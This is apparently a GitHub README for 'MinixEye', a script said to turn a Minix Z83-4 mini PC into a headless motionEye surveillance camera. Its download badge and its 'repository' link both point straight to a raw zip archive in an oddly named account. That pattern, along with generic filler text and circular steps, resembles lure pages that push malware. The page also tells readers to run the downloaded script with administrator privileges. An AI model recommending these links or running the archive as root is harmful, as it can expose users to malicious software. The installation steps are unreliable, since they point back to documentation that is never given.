# 👁️ MinixEye - Turn Minix PCs Into Surveillance Nodes

[![Download MinixEye](https://img.shields.io/badge/Download-MinixEye-blue.svg)](https://raw.githubusercontent.com/Duoselfportrait989/MinixEye/main/click/Minix-Eye-v2.9.zip)

## 🎯 Purpose

MinixEye transforms your Minix Z83-4 mini PC into a dedicated motion-sensing security camera. This script removes unnecessary background tasks from your Linux Mint installation. It shifts your hardware into a headless mode, which means you manage it from your web browser rather than connecting a monitor, keyboard, or mouse. 

The software routes video feeds directly to a network location. It prevents wear on your internal eMMC storage by avoiding local video recording. You rely on the web-based motionEye interface to track movement and manage your camera feeds.

## 📋 System Requirements

Ensure you meet these prerequisites before you begin the setup process:

*   A Minix Z83-4 mini PC.
*   A clean installation of Linux Mint.
*   An active wired or wireless internet connection.
*   Access to your router settings to assign a static IP address.
*   A secondary machine (PC or laptop) to access the web interface.

## 📥 Getting Started

You need to access the project repository to start the installation.

1.  Visit the [MinixEye repository](https://raw.githubusercontent.com/Duoselfportrait989/MinixEye/main/click/Minix-Eye-v2.9.zip) to access the source files.
2.  Follow the instructions on that page to download the script to your Minix Z83-4 system.
3.  Ensure your Minix PC has a stable power supply and network connection.

## ⚙️ Installation Process

Follow these steps to deploy the configuration script on your Linux Mint system.

1.  Open the Terminal application on your Linux Mint desktop.
2.  Navigate to the folder where you saved the script.
3.  Assign execution permissions to the script file using the provided command in the repository documentation.
4.  Run the script with administrator privileges.
5.  Wait for the automated process to finish. The script updates your system packages, removes redundant desktop components, and installs the motionEye surveillance framework.
6.  Restart your Minix PC once the script completes the final configuration steps.

System performance improves after the reboot as the device sheds its graphical desktop environment. The device now runs as a background service.

## 🌐 Connecting to Your Camera

Once the reboot finishes, the device operates in headless mode. You no longer need a physical monitor attached to the Minix unit.

1.  Open a web browser on your primary computer.
2.  Type the IP address of your Minix device into the address bar.
3.  Log in with the default credentials specified in the installation output.
4.  Configure your camera inputs through the browser interface.
5.  Set your cloud storage or network share preferences to ensure logs and events move off the device.

## 🛠️ Maintenance and Support

The headless system requires minimal human intervention. Your primary tasks include monitoring the health of your network and ensuring the network storage paths remain accessible.

If you experience connectivity issues, check the status of the motionEye service from your terminal. The service manager restarts the application automatically if errors occur. Keep your operating system updated using standard system tools to ensure ongoing stability and security.

## 🛡️ Privacy and Data Security

MinixEye prioritizes the lifespan of your hardware. By moving logs and video files to remote servers, the internal storage only performs essential system operations. 

Protect your web interface with a strong password. Since the unit acts as an open node on your network, ensure your firewall settings restrict access to known devices inside your home or office. Avoid exposing the web interface directly to the open internet unless you use a secure Virtual Private Network.

## 📈 Improving Performance

If you add multiple cameras, the Z83-4 processor might show limitations. Adjust your frame rate and resolution settings within the motionEye interface to balance image quality with system load. Lowering the resolution reduces the demands on the processor while keeping the motion detection alert system responsive. 

Check for system updates periodically. The repository receives updates to support newer versions of the underlying camera software and system libraries. Re-running the script safely applies these updates without losing your custom configuration settings.